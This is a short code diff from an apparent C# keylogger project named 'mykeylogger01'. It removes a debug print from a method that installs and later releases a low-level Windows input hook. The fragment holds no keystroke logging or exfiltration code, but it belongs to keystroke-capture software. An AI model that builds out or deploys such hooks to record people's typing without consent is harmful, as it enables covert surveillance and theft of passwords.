@@ -20,7 +20,6 @@ namespace mykeylogger01
         {
             hook = SetHook(llkProcedure);
             Application.Run();
-            Console.Out.Write("hi");
             UnhookWindowsHookEx(hook);
         }
 
